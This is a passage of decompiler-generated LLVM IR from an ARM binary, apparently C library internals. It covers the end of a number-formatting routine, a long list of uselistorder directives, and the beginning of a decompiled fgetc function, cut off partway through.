  %v1_1680c = load i32, i32* %ip.global-to-local, align 4
  %v2_1680c = load i32, i32* %r7.global-to-local, align 4
  %v3_1680c = add i32 %v2_1680c, 4
  %v4_1680c = inttoptr i32 %v3_1680c to i32*
  store i32 %v1_1680c, i32* %v4_1680c, align 4
  %v1_16810 = load i32, i32* %r7.global-to-local, align 4
  %v2_16810 = add i32 %v1_16810, 12
  store i32 %v2_16810, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_167fc, %bb249
  %v1_16848 = phi i32 [ %v2_16804, %dec_label_pc_167fc ], [ %v2_16810, %bb249 ]
  %v0_16814 = load i32, i32* %sb.global-to-local, align 4
  %v7_16814 = icmp eq i32 %v0_16814, 103
  store i1 %v7_16814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16814, label %dec_label_pc_1681c, label %dec_label_pc_16824

dec_label_pc_1681c:                               ; preds = %.thread46
  %v0_1681c = load i32, i32* %r4.global-to-local, align 4
  %v2_1681c = icmp eq i32 %v0_1681c, 0
  store i1 %v2_1681c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1681c, label %dec_label_pc_16854, label %dec_label_pc_16824

dec_label_pc_16824:                               ; preds = %.thread46, %dec_label_pc_1681c
  %v0_16824 = load i32, i32* %lr.global-to-local, align 4
  %v1_16824 = load i32, i32* %ip.global-to-local, align 4
  %v2_16824 = sub i32 %v1_16824, %v0_16824
  store i32 %v2_16824, i32* %r1.global-to-local, align 4
  %v1_16828 = load i32, i32* %fp.global-to-local, align 4
  %v2_16828 = sub i32 %v2_16824, %v1_16828
  %v4_16828 = xor i32 %v1_16828, %v2_16824
  %v5_16828 = xor i32 %v2_16828, %v2_16824
  %v6_16828 = and i32 %v5_16828, %v4_16828
  %v7_16828 = icmp slt i32 %v6_16828, 0
  %v8_16828 = icmp slt i32 %v2_16828, 0
  %v9_16828 = icmp eq i32 %v2_16824, %v1_16828
  store i1 %v9_16828, i1* %cpsr_z.global-to-local, align 1
  %v2_1682c = xor i1 %v8_16828, %v7_16828
  br i1 %v2_1682c, label %dec_label_pc_16830, label %dec_label_pc_16854

dec_label_pc_16830:                               ; preds = %dec_label_pc_16824
  %v2_1683c = sub i32 %v1_16828, %v2_16824
  store i32 %v2_1683c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33049), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_16848 = inttoptr i32 %v1_16848 to i32*
  store i32 176, i32* %v2_16848, align 4
  %v0_1684c = load i32, i32* %r7.global-to-local, align 4
  %v1_1684c = add i32 %v0_1684c, 4
  %v2_1684c = inttoptr i32 %v1_1684c to i32*
  %v3_1684c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1684c, i32* %v2_1684c, align 4
  %v4_1684c = add i32 %v0_1684c, 8
  %v5_1684c = inttoptr i32 %v4_1684c to i32*
  %v6_1684c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1684c, i32* %v5_1684c, align 4
  %v0_16850 = load i32, i32* %r7.global-to-local, align 4
  %v1_16850 = add i32 %v0_16850, 12
  store i32 %v1_16850, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16854

dec_label_pc_16854:                               ; preds = %dec_label_pc_16824, %dec_label_pc_1681c, %dec_label_pc_16830
  %v1_168e8.pre.pre = phi i32 [ %v1_16848, %dec_label_pc_16824 ], [ %v1_16848, %dec_label_pc_1681c ], [ %v1_16850, %dec_label_pc_16830 ]
  %v0_16854 = load i32, i32* %r8.global-to-local, align 4
  %v7_16854 = icmp eq i32 %v0_16854, 102
  store i1 %v7_16854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16854, label %dec_label_pc_168dc, label %dec_label_pc_1685c

dec_label_pc_1685c:                               ; preds = %dec_label_pc_16854
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16860 = load i32, i32* %r0.global-to-local, align 4
  %v1_16860 = icmp slt i32 %v0_16860, 0
  %v2_16860 = icmp eq i32 %v0_16860, 0
  store i1 %v2_16860, i1* %cpsr_z.global-to-local, align 1
  %v4_16864 = select i1 %tmp275, i32 %v4_16580126130, i32 101
  store i32 %v4_16864, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_16874 = sub i32 0, %v0_16860
  %storemerge158 = select i1 %v1_16860, i32 %v4_16874, i32 %v0_16860
  %tmp271 = ashr i32 %v0_16860, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_1687c = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_1687c, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16884

dec_label_pc_16884:                               ; preds = %dec_label_pc_168b4, %dec_label_pc_16884, %dec_label_pc_1685c
  %v2_1689c = phi i32 [ %v2_1687c, %dec_label_pc_1685c ], [ %v6_1689c, %dec_label_pc_16884 ], [ %v6_1689c, %dec_label_pc_168b4 ]
  %v0_16894 = phi i32 [ %storemerge158, %dec_label_pc_1685c ], [ %v2_168a0, %dec_label_pc_16884 ], [ %v2_168a0, %dec_label_pc_168b4 ]
  %v3_1688c = urem i32 %v0_16894, 10
  %v1_16890 = or i32 %v3_1688c, 48
  store i32 %v1_16890, i32* %r3.global-to-local, align 4
  store i32 %v0_16894, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1689c = trunc i32 %v1_16890 to i8
  %v3_1689c = add i32 %v2_1689c, -1
  %v4_1689c = inttoptr i32 %v3_1689c to i8*
  store i8 %v1_1689c, i8* %v4_1689c, align 1
  %v5_1689c = load i32, i32* %r6.global-to-local, align 4
  %v6_1689c = add i32 %v5_1689c, -1
  store i32 %v6_1689c, i32* %r6.global-to-local, align 4
  %v0_168a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_168a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_168a0 = sdiv i32 %v0_168a0, %v1_168a0
  store i32 %v2_168a0, i32* %r0.global-to-local, align 4
  %v0_168a4 = load i32, i32* %r8.global-to-local, align 4
  %v1_168a4 = add i32 %v0_168a4, 1
  store i32 %v1_168a4, i32* %r8.global-to-local, align 4
  %v7_168a8 = icmp eq i32 %v1_168a4, 3
  store i1 %v7_168a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_168a0, i32* %r5.global-to-local, align 4
  br i1 %v7_168a8, label %dec_label_pc_16884, label %dec_label_pc_168b4

dec_label_pc_168b4:                               ; preds = %dec_label_pc_16884
  %v2_168b4 = icmp eq i32 %v2_168a0, 0
  store i1 %v2_168b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168b4, label %dec_label_pc_168bc, label %dec_label_pc_16884

dec_label_pc_168bc:                               ; preds = %dec_label_pc_168b4
  %v1_168bc = add i32 %v5_1689c, -2
  store i32 %v1_168bc, i32* %r3.global-to-local, align 4
  %v0_168c0 = load i32, i32* %sl.global-to-local, align 4
  %v1_168c0 = trunc i32 %v0_168c0 to i8
  %v4_168c0 = inttoptr i32 %v1_168bc to i8*
  store i8 %v1_168c0, i8* %v4_168c0, align 1
  %v0_168c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_168c4 = add i32 %v0_168c4, -1
  store i32 %v1_168c4, i32* %r2.global-to-local, align 4
  %v0_168c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_168c8 = trunc i32 %v0_168c8 to i8
  %v4_168c8 = inttoptr i32 %v1_168c4 to i8*
  store i8 %v1_168c8, i8* %v4_168c8, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_168d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_168d0 = inttoptr i32 %v0_168d0 to i32*
  store i32 112, i32* %v1_168d0, align 4
  %v3_168d0 = add i32 %v0_168d0, 4
  %v4_168d0 = inttoptr i32 %v3_168d0 to i32*
  %v5_168d0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_168d0, i32* %v4_168d0, align 4
  %v0_168d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_168d4 = load i32, i32* %r7.global-to-local, align 4
  %v2_168d4 = add i32 %v1_168d4, 8
  %v3_168d4 = inttoptr i32 %v2_168d4 to i32*
  store i32 %v0_168d4, i32* %v3_168d4, align 4
  %v0_168d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_168d8 = add i32 %v0_168d8, 12
  store i32 %v1_168d8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_168dc

dec_label_pc_168dc:                               ; preds = %dec_label_pc_16854, %.thread124, %dec_label_pc_168bc
  %v1_168e8.pre = phi i32 [ %v2_163b4, %.thread124 ], [ %v1_168d8, %dec_label_pc_168bc ], [ %v1_168e8.pre.pre, %dec_label_pc_16854 ]
  %v2_168dc = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_168dc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_168e0

dec_label_pc_168e0:                               ; preds = %dec_label_pc_168e0, %dec_label_pc_168dc
  %v0_168e0 = phi i32 [ %v2_168dc, %dec_label_pc_168dc ], [ %v4_168e0, %dec_label_pc_168e0 ]
  %stack_var_-188.0 = phi i32 [ %v3_16250, %dec_label_pc_168dc ], [ %v2_168ec, %dec_label_pc_168e0 ]
  %v1_168e0 = inttoptr i32 %v0_168e0 to i32*
  %v2_168e0 = load i32, i32* %v1_168e0, align 4
  store i32 %v2_168e0, i32* %r3.global-to-local, align 4
  %v4_168e0 = add i32 %v0_168e0, 12
  store i32 %v4_168e0, i32* %r2.global-to-local, align 4
  %v3_168e8 = icmp ult i32 %v4_168e0, %v1_168e8.pre
  %v2_168ec = sub i32 %stack_var_-188.0, %v2_168e0
  store i32 %v2_168ec, i32* %ip.global-to-local, align 4
  br i1 %v3_168e8, label %dec_label_pc_168e0, label %dec_label_pc_168f8

dec_label_pc_168f8:                               ; preds = %dec_label_pc_168e0
  %v3_168f8 = load i8, i8* %stack_var_-46, align 1
  %v4_168f8 = sext i8 %v3_168f8 to i32
  store i32 %v4_168f8, i32* %r3.global-to-local, align 4
  store i32 %v4_168f8, i32* %r2.global-to-local, align 4
  %v2_168fc = icmp eq i8 %v3_168f8, 0
  store i1 %v2_168fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168fc, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_168f8
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_168f8, %bb253
  %v1_1695c = phi i32 [ %v4_168f8, %dec_label_pc_168f8 ], [ 1, %bb253 ]
  %v2_16904 = sub i32 %v2_168ec, %v1_1695c
  store i32 %v2_16904, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_1690c = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_1690c, i32* %r3.global-to-local, align 4
  %v2_16910 = icmp eq i32 %v2_16904, 0
  store i1 %v2_16910, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_16904, 1
  br i1 %tmp255, label %dec_label_pc_16978, label %dec_label_pc_16924

dec_label_pc_16924:                               ; preds = %bb254
  %v3_16924 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16924, i32* %lr.global-to-local, align 4
  %v1_16928 = add i32 %v3_16924, 12
  %v2_16928 = inttoptr i32 %v1_16928 to i32*
  %v3_16928 = load i32, i32* %v2_16928, align 4
  store i32 %v3_16928, i32* %r3.global-to-local, align 4
  %v1_1692c = and i32 %v3_16928, 8
  %v2_1692c = icmp eq i32 %v1_1692c, 0
  store i1 %v2_1692c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1692c, label %dec_label_pc_16950, label %dec_label_pc_16934

dec_label_pc_16934:                               ; preds = %dec_label_pc_16924
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33049), i32* %r3.global-to-local, align 4
  %v1_16944 = add i32 %v1_168e8.pre, 12
  store i32 %v1_16944, i32* %r6.global-to-local, align 4
  %v1_16948 = inttoptr i32 %v1_168e8.pre to i32*
  store i32 160, i32* %v1_16948, align 4
  %v3_16948 = add i32 %v1_168e8.pre, 4
  %v4_16948 = inttoptr i32 %v3_16948 to i32*
  %v5_16948 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16948, i32* %v4_16948, align 4
  %v6_16948 = add i32 %v1_168e8.pre, 8
  %v7_16948 = inttoptr i32 %v6_16948 to i32*
  %v8_16948 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_16948, i32* %v7_16948, align 4
  br label %dec_label_pc_1697c

dec_label_pc_16950:                               ; preds = %dec_label_pc_16924
  store i32 %v3_16924, i32* %ip.global-to-local, align 4
  %v1_16954 = add i32 %v3_16924, 16
  %v2_16954 = inttoptr i32 %v1_16954 to i32*
  %v3_16954 = load i32, i32* %v2_16954, align 4
  store i32 %v3_16954, i32* %r3.global-to-local, align 4
  %v7_16958 = icmp eq i32 %v3_16954, 48
  store i1 %v7_16958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16958, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_16950
  store i32 %v2_168ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16978

.thread54.thread70:                               ; preds = %dec_label_pc_16950
  %v4_16964 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_168e8.pre, i32* %r6.global-to-local, align 4
  %v3_1696c = add i32 %v4_16964, %v2_16904
  store i32 %v3_1696c, i32* %r3.global-to-local, align 4
  store i32 %v3_1696c, i32* %stack_var_-164, align 4
  br label %dec_label_pc_1697c

dec_label_pc_16978:                               ; preds = %bb256, %bb254
  store i32 %v1_168e8.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1697c

dec_label_pc_1697c:                               ; preds = %.thread54.thread70, %dec_label_pc_16934, %dec_label_pc_16978
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_16980 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_16980, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16984

dec_label_pc_16984:                               ; preds = %dec_label_pc_169ac, %dec_label_pc_1697c
  %v0_16984 = phi i32 [ %v1_169a0, %dec_label_pc_169ac ], [ %v2_16980, %dec_label_pc_1697c ]
  %v1_16984 = inttoptr i32 %v0_16984 to i32*
  %v2_16984 = load i32, i32* %v1_16984, align 4
  store i32 %v2_16984, i32* %r1.global-to-local, align 4
  %v3_16984 = add i32 %v0_16984, 4
  %v4_16984 = inttoptr i32 %v3_16984 to i32*
  %v5_16984 = load i32, i32* %v4_16984, align 4
  store i32 %v5_16984, i32* %r2.global-to-local, align 4
  %v6_16984 = add i32 %v0_16984, 8
  %v7_16984 = inttoptr i32 %v6_16984 to i32*
  %v8_16984 = load i32, i32* %v7_16984, align 4
  store i32 %v8_16984, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 92568, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_16998 = load i32, i32* %r5.global-to-local, align 4
  %v1_16998 = add i32 %v0_16998, 4
  %v2_16998 = inttoptr i32 %v1_16998 to i32*
  %v3_16998 = load i32, i32* %v2_16998, align 4
  store i32 %v3_16998, i32* %r3.global-to-local, align 4
  %v0_1699c = load i32, i32* %r0.global-to-local, align 4
  %v9_1699c = icmp eq i32 %v0_1699c, %v3_16998
  store i1 %v9_1699c, i1* %cpsr_z.global-to-local, align 1
  %v1_169a0 = add i32 %v0_16998, 12
  store i32 %v1_169a0, i32* %r5.global-to-local, align 4
  br i1 %v9_1699c, label %dec_label_pc_169ac, label %bb257

bb257:                                            ; preds = %dec_label_pc_16984
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_169cc

dec_label_pc_169ac:                               ; preds = %dec_label_pc_16984
  %v0_169b0.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_169ac = load i32, i32* %r6.global-to-local, align 4
  %v3_169ac = icmp ult i32 %v1_169a0, %v1_169ac
  %v9_169ac = icmp eq i32 %v1_169a0, %v1_169ac
  store i1 %v9_169ac, i1* %cpsr_z.global-to-local, align 1
  %v2_169b0 = add i32 %v0_169b0.pre, %v3_16998
  store i32 %v2_169b0, i32* %r7.global-to-local, align 4
  br i1 %v3_169ac, label %dec_label_pc_16984, label %dec_label_pc_169cc

dec_label_pc_169c4:                               ; preds = %.thread21, %bb239
  %v0_169c4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_169c4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_166c4

dec_label_pc_169cc:                               ; preds = %dec_label_pc_169ac, %bb257
  %v0_169cc = phi i32 [ -1, %bb257 ], [ %v2_169b0, %dec_label_pc_169ac ]
  store i32 %v0_169cc, i32* %r0.global-to-local, align 4
  store i32 %v27_16208, i32* @lr, align 4
  ret i32 %v0_169cc

; uselistorder directives
  uselistorder i32 %v0_169cc, { 1, 0 }
  uselistorder i32 %v1_169ac, { 1, 0 }
  uselistorder i32 %v1_169a0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16984, { 2, 1, 0 }
  uselistorder i32 %v3_16924, { 1, 0, 2, 3 }
  uselistorder i32 %v2_168ec, { 0, 1, 3, 2 }
  uselistorder i32 %v4_168e0, { 1, 2, 0 }
  uselistorder i32 %v0_168e0, { 1, 0 }
  uselistorder i32 %v1_168e8.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_168a0, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_1689c, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_16860, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_16828, { 1, 0 }
  uselistorder i32 %v1_16828, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16824, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_16784, { 2, 1, 0 }
  uselistorder i32 %v2_16704, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_166f4, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_166e0, { 1, 0, 2 }
  uselistorder i32 %v5_166dc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1676c30, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_16694, { 1, 0 }
  uselistorder i32 %v1_1668c, { 1, 2, 0 }
  uselistorder i32 %v2_16680, { 1, 0 }
  uselistorder i32 %v1_16680, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16680, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_16650, { 1, 0 }
  uselistorder i32 %v0_16650, { 0, 2, 1 }
  uselistorder i32 %v2_1664c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_16638, { 1, 0 }
  uselistorder i1 %v2_16628, { 1, 0 }
  uselistorder i32 %v1_16624, { 3, 2, 1, 0 }
  uselistorder i32 %v2_16620, { 1, 0 }
  uselistorder i1 %v2_16610, { 1, 0 }
  uselistorder i32 %v1_16604, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_165b8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_165b8, { 1, 0, 2 }
  uselistorder i1 %v2_165a0, { 1, 0 }
  uselistorder i32 %v5_16588, { 1, 0 }
  uselistorder i32 %v0_16574, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1655c, { 1, 2, 0 }
  uselistorder i32 %v2_16558, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_164f0, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16498, { 1, 0 }
  uselistorder double %v2_1645c, { 1, 0 }
  uselistorder i32 %v0_16418, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_1640c, { 1, 0 }
  uselistorder i32 %v2_16448, { 1, 3, 0, 2 }
  uselistorder i32 %v0_163dc, { 1, 0 }
  uselistorder i32 %v5_16398, { 1, 0 }
  uselistorder i32 %v1_162b8.v0_162a45, { 1, 0 }
  uselistorder i32 %v3_16374, { 1, 0 }
  uselistorder i32 %v0_16350, { 0, 2, 3, 1 }
  uselistorder i32 %v2_16338, { 2, 1, 0 }
  uselistorder i32 %v0_1631c, { 1, 0 }
  uselistorder i32 %v0_1623c, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 21, 0, 22, 1, 2, 3, 4, 19, 20, 5, 6, 9, 10, 11, 7, 12, 13, 8, 14, 17, 15, 16, 18 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 26, 27, 29, 43, 30, 34, 31, 32, 33, 35, 28, 36, 37, 38, 39, 40, 41, 42, 64, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 2, 65, 66, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 12, 15, 16, 13, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 7, 1, 8, 9, 15, 18, 17, 16, 10, 11, 19, 12, 13, 3, 20, 14, 0, 21, 22, 37, 38, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 61, 18, 19, 20, 21, 22, 23, 24, 25, 60, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 59, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 112, { 2, 11, 0, 12, 3, 1, 13, 4, 6, 5, 7, 8, 9, 10 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33028), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33052), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 1, 3, 4, 5, 2, 6, 0, 7 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_169c4, { 1, 0 }
  uselistorder label %dec_label_pc_1697c, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_168dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16854, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16824, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_167fc, { 1, 0 }
  uselistorder label %dec_label_pc_167d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_167ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1677c, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_166c4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_166b4, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_165dc, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_164e8, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_16498, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16490, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_16374, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_16290, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_169fc = load i32, i32* @r4, align 4
  store i32 %v3_169fc, i32* %stack_var_-16, align 4
  %v6_169fc = load i32, i32* @r5, align 4
  %v12_169fc = load i32, i32* @lr, align 4
  %v1_16a00 = add i32 %arg1, 52
  %v2_16a00 = inttoptr i32 %v1_16a00 to i32*
  %v3_16a00 = load i32, i32* %v2_16a00, align 4
  %v2_16a08 = icmp eq i32 %v3_16a00, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r6.global-to-local, align 4
  br i1 %v2_16a08, label %dec_label_pc_16a40, label %dec_label_pc_16a1c

dec_label_pc_16a1c:                               ; preds = %entry
  %v1_16a1c = add i32 %arg1, 16
  %v2_16a1c = inttoptr i32 %v1_16a1c to i32*
  %v3_16a1c = load i32, i32* %v2_16a1c, align 4
  %v1_16a20 = add i32 %arg1, 24
  %v2_16a20 = inttoptr i32 %v1_16a20 to i32*
  %v3_16a20 = load i32, i32* %v2_16a20, align 4
  %v3_16a24 = icmp ult i32 %v3_16a1c, %v3_16a20
  br i1 %v3_16a24, label %.thread, label %dec_label_pc_16a34

.thread:                                          ; preds = %dec_label_pc_16a1c
  %v2_16a28 = inttoptr i32 %v3_16a1c to i8*
  %v3_16a28 = load i8, i8* %v2_16a28, align 1
  %v4_16a28 = zext i8 %v3_16a28 to i32
  store i32 %v4_16a28, i32* %r4.global-to-local, align 4
  %v6_16a28 = add i32 %v3_16a1c, 1
  store i32 %v6_16a28, i32* %v2_16a1c, align 4
  br label %dec_label_pc_16ab4

dec_label_pc_16a34:                               ; preds = %dec_label_pc_16a1c
  %v1_16a34 = inttoptr i32 %arg1 to i16*
  %v2_16a34 = call i32 @getc_unlocked(i16* %v1_16a34)
  store i32 %v2_16a34, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16ab4

dec_label_pc_16a40:                               ; preds = %entry
  %v1_16a44 = add i32 %arg1, 56
  store i32 %v1_16a44, i32* @r4, align 4
  %v4_16a58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_16a58)
  %v0_16a6c = load i32, i32* %r6.global-to-local, align 4
  %v2_16a6c = add i32 %v0_16a6c, 16
  %v3_16a6c = inttoptr i32 %v2_16a6c to i32*
  %v4_16a6c = load i32, i32* %v3_16a6c, align 4
